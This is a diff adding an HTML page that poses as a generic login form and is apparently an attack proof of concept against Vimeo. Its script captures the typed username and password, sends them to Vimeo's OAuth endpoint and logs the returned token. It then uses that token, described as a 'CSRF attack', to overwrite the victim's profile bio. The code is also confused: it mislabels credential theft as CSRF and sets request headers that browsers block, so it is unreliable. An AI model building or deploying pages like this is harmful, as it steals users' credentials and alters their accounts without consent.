@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <form id="loginForm">
+        <input type="text" id="username" name="username" placeholder="Username" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Simulate login and capture JWT (this is a placeholder, replace with actual logic)
+            fetch('https://api.vimeo.com/oauth/authorize', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username: username, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                var jwt = data.token;
+                console.log('Captured JWT:', jwt);
+
+                // Now use this JWT for CSRF attack
+                fetch('https://api.vimeo.com/me?fields=bio', {
+                    method: 'PATCH',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'jwt ' + jwt,
+                        'Accept': 'application/vnd.vimeo.*; version=3.4.2',
+                        'Sec-Fetch-Site': 'same-site',
+                        'Sec-Fetch-Mode': 'cors',
+                        'Sec-Fetch-Dest': 'empty',
+                        'Referer': 'https://vimeo.com/',
+                        'Origin': 'https://vimeo.com'
+                    },
+                    body: JSON.stringify({
+                        bio: "You've been CSRF-ed. LOL."
+                    })
+                }).then(response => response.text())
+                  .then(data => console.log(data));
+            });
+        });
+    </script>
+</body>
+</html>
